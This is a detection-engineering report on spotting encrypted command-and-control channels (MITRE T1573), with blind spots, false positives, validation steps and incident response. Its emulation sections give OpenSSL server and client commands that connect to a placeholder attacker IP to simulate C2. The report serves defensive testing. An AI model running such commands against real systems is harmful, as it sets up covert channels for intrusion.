# Alerting & Detection Strategy (ADS) Report: Detect Adversarial Attempts to Bypass Security Monitoring Using Encrypted Channels

## Goal
The objective of this technique is to detect adversarial attempts to bypass security monitoring by using encrypted channels, specifically focusing on the MITRE ATT&CK technique T1573 - Encrypted Channel. This detection aims to identify unauthorized command and control communications that adversaries encrypt to avoid detection.

## Categorization
- **MITRE ATT&CK Mapping:** T1573 - Encrypted Channel
- **Tactic / Kill Chain Phases:** Command and Control (C2)
- **Platforms:** Linux, macOS, Windows
- [MITRE ATT&CK Reference](https://attack.mitre.org/techniques/T1573)

## Strategy Abstract
The detection strategy focuses on identifying patterns indicative of encrypted command and control communications across various platforms. Key data sources include network traffic logs, process monitoring tools, and endpoint detection systems. Patterns analyzed involve unusual encryption software usage, unexpected outbound connections to known or suspicious domains/IPs, anomalous certificate generation activities, and irregularities in DNS queries.

## Technical Context
Adversaries use encrypted channels by leveraging legitimate encryption protocols like TLS/SSL to disguise their command and control communications. This can be executed using tools such as OpenSSL for establishing secure tunnels that appear benign to traditional security monitoring systems.

### Adversary Emulation Details:
- **OpenSSL C2 Example:** Adversaries may set up an OpenSSL server and client to facilitate encrypted communication between the attacker's infrastructure and compromised endpoints.
- **Sample Commands:**
  - Setting up an OpenSSL server:
    ```bash
    openssl s_server -accept 4433 -cert server.crt -key server.key
    ```
  - Configuring an OpenSSL client:
    ```bash
    openssl s_client -connect <ATTACKER_IP>:4433
    ```

## Blind Spots and Assumptions
- **Blind Spots:** 
  - Encrypted channels with legitimate certificates might evade detection.
  - Detection may not be effective against custom encryption protocols or highly obfuscated traffic.
- **Assumptions:**
  - The adversary uses standard encryption tools that can be detected via behavioral analysis.
  - Security systems have visibility into network and endpoint activities.

## False Positives
Potential benign activities that might trigger false alerts include:
- Legitimate use of OpenSSL for secure communications in development or testing environments.
- Standard SSL/TLS traffic from well-known services that are not malicious.
- Internal tools using encryption for data protection without intent to exfiltrate data.

## Priority
**Priority: High**

Justification: Encrypted channels can significantly reduce the visibility of command and control activities, allowing adversaries to maintain persistence and achieve their objectives undetected. The ability to evade security monitoring makes this a high-priority threat vector that requires robust detection mechanisms.

## Validation (Adversary Emulation)
To validate the detection strategy in a test environment:

1. **Setup Test Environment:**
   - Prepare isolated network segments for testing.
   - Deploy endpoint systems across Linux, macOS, and Windows platforms.

2. **Emulate OpenSSL C2:**
   - On an attacker-controlled machine (e.g., Linux VM), set up an OpenSSL server:
     ```bash
     openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes
     openssl s_server -accept 4433 -cert server.crt -key server.key
     ```
   - On a compromised endpoint (e.g., Windows VM), configure an OpenSSL client to connect to the attacker's server:
     ```bash
     openssl.exe s_client -connect <ATTACKER_IP>:4433
     ```

3. **Monitor and Analyze:**
   - Use network traffic analysis tools to detect encrypted communication attempts.
   - Monitor process logs for unexpected encryption software usage.

## Response
When an alert indicating potential use of encrypted channels is triggered:

1. **Immediate Investigation:**
   - Review the source IP addresses, destination domains/IPs, and associated certificates involved in the suspicious activity.
   - Cross-reference with known threat intelligence databases to identify any malicious indicators.

2. **Containment Measures:**
   - Isolate affected systems from the network to prevent further unauthorized communication.
   - Block outbound connections to identified malicious domains or IP addresses at the firewall level.

3. **Forensic Analysis:**
   - Conduct a thorough forensic analysis of compromised endpoints to determine the scope and method of compromise.
   - Examine logs for additional indicators of compromise (IoCs) that may indicate lateral movement or data exfiltration attempts.

4. **Post-Incident Review:**
   - Update detection rules based on findings to reduce false positives and enhance detection capabilities.
   - Share insights with the broader security community to improve collective defense mechanisms.
